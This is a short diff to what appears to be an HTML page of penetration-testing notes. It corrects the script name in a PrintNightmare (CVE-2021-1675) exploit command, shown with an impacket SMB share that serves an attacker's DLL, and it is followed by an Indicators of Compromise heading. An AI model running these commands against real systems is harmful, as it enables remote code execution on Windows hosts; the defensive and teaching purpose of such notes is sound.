@@ -593,7 +593,7 @@ HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoEl
 <pre><code class="language-bash">impacket-smbserver -smb2support share /path/to/folder/with/DLL
 </code></pre>
 <p>Finally, exploit the target:</p>
-<pre><code class="language-bash">python3 CVE-2021-1675 domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
+<pre><code class="language-bash">python3 CVE-2021-1675.py domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
 </code></pre>
 <p><img src="./images/Pasted%20image%2020230606100148.png" alt="successful connection" /></p>
 <h4 id="indicators-of-compromise-14"><a class="header" href="#indicators-of-compromise-14">Indicators of Compromise</a></h4>
